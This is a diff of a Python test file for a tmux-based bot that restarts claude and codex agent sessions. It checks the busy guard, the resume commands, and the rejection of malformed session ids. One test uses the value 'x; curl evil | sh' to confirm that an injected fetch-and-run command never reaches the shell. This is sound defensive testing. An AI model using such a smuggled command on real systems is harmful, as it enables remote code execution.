@@ -69,9 +69,11 @@ class TestRestartBusyGuard:
         with (
             patch("ccbot.handlers.callbacks.session_manager") as sm,
             patch("ccbot.handlers.callbacks.tmux_manager") as tm,
-            patch("ccbot.handlers.callbacks.is_claude_working", return_value=True),
         ):
             sm._is_docker_binding.return_value = False
+            # Runtime-aware busy check now lives on session_manager (dispatches
+            # by WindowState.runtime); True = agent mid-turn → refuse.
+            sm.is_agent_working.return_value = True
             sm.get_window_state.return_value = MagicMock(session_id="sid")
             tm.find_window_by_id = AsyncMock(return_value=MagicMock())
             tm.capture_pane = AsyncMock(return_value="✻ Cooking… (esc to interrupt)")
@@ -92,16 +94,17 @@ class TestRestartBusyGuard:
         with (
             patch("ccbot.handlers.callbacks.session_manager") as sm,
             patch("ccbot.handlers.callbacks.tmux_manager") as tm,
-            patch("ccbot.handlers.callbacks.is_claude_working", return_value=False),
-            patch("ccbot.handlers.callbacks.config") as cfg,
+            # launch_command / exit_command read config from ccbot.runtimes.
+            patch("ccbot.runtimes.config") as rcfg,
             patch("ccbot.handlers.callbacks._cmd_refresh_photo", new=AsyncMock()),
         ):
-            cfg.claude_command = "claude"
+            rcfg.claude_command = "claude"
             sm._is_docker_binding.return_value = False
+            sm.is_agent_working.return_value = False
             sm.get_window_state.return_value = MagicMock(
-                session_id="11111111-2222-3333-4444-555555555555"
+                session_id="11111111-2222-3333-4444-555555555555", runtime="claude"
             )
-            tm.find_window_by_id = AsyncMock(return_value=MagicMock())
+            tm.find_window_by_id = AsyncMock(return_value=MagicMock(window_name="proj"))
             tm.capture_pane = AsyncMock(return_value="❯ ")
             tm.send_keys = AsyncMock()
             # _wait_pane_ready polls session_manager.capture_pane until the
@@ -112,9 +115,12 @@ class TestRestartBusyGuard:
             await _restart_agent(query, "@5", fresh=False)
 
             sent = [c.args[1] for c in tm.send_keys.await_args_list]
+            # Restart now goes through the runtime's exit + launch commands
+            # (claude: /exit → `claude --name … --resume …`), consistent with
+            # create_window.
             assert sent == [
                 "/exit",
-                "claude --resume 11111111-2222-3333-4444-555555555555",
+                "claude --name proj --resume 11111111-2222-3333-4444-555555555555",
             ]
 
     async def test_malformed_session_id_starts_fresh_no_injection(
@@ -133,14 +139,16 @@ class TestRestartBusyGuard:
         with (
             patch("ccbot.handlers.callbacks.session_manager") as sm,
             patch("ccbot.handlers.callbacks.tmux_manager") as tm,
-            patch("ccbot.handlers.callbacks.is_claude_working", return_value=False),
-            patch("ccbot.handlers.callbacks.config") as cfg,
+            patch("ccbot.runtimes.config") as rcfg,
             patch("ccbot.handlers.callbacks._cmd_refresh_photo", new=AsyncMock()),
         ):
-            cfg.claude_command = "claude"
+            rcfg.claude_command = "claude"
             sm._is_docker_binding.return_value = False
-            sm.get_window_state.return_value = MagicMock(session_id="x; curl evil | sh")
-            tm.find_window_by_id = AsyncMock(return_value=MagicMock())
+            sm.is_agent_working.return_value = False
+            sm.get_window_state.return_value = MagicMock(
+                session_id="x; curl evil | sh", runtime="claude"
+            )
+            tm.find_window_by_id = AsyncMock(return_value=MagicMock(window_name="proj"))
             tm.capture_pane = AsyncMock(return_value="❯ ")
             tm.send_keys = AsyncMock()
             sm.capture_pane = AsyncMock(return_value="❯ \n" + "─" * 100 + "\n")
@@ -148,9 +156,48 @@ class TestRestartBusyGuard:
             await _restart_agent(query, "@5", fresh=False)
 
             sent = [c.args[1] for c in tm.send_keys.await_args_list]
-            # No --resume appended; the payload never reaches the shell line.
-            assert sent == ["/exit", "claude"]
+            # launch_command validates the id (is_valid_session_id) — no --resume
+            # appended, so the payload never reaches the shell line.
+            assert sent == ["/exit", "claude --name proj"]
             assert all("curl evil" not in s for s in sent)
+
+    @pytest.mark.asyncio
+    async def test_codex_tmux_agent_restarts_with_quit_and_resume(
+        self, query, monkeypatch
+    ):
+        """A codex window restarts via its own exit (/quit) + resume (codex
+        resume <id>), not claude's /exit + `claude --resume`."""
+
+        async def _no_sleep(_):
+            return None
+
+        monkeypatch.setattr(asyncio, "sleep", _no_sleep)
+        with (
+            patch("ccbot.handlers.callbacks.session_manager") as sm,
+            patch("ccbot.handlers.callbacks.tmux_manager") as tm,
+            patch("ccbot.runtimes.config") as rcfg,
+            patch("ccbot.handlers.callbacks._cmd_refresh_photo", new=AsyncMock()),
+        ):
+            rcfg.codex_command = "codex"
+            sm._is_docker_binding.return_value = False
+            sm.is_agent_working.return_value = False
+            sm.get_window_state.return_value = MagicMock(
+                session_id="019f0000-0000-7000-8000-000000000000", runtime="codex"
+            )
+            tm.find_window_by_id = AsyncMock(
+                return_value=MagicMock(window_name="myproject")
+            )
+            tm.capture_pane = AsyncMock(return_value="› ")
+            tm.send_keys = AsyncMock()
+            sm.capture_pane = AsyncMock(return_value="› \n" + "─" * 100 + "\n")
+
+            await _restart_agent(query, "@9", fresh=False)
+
+            sent = [c.args[1] for c in tm.send_keys.await_args_list]
+            assert sent == [
+                "/quit",
+                "codex resume 019f0000-0000-7000-8000-000000000000",
+            ]
 
 
 class TestGuardedWid:
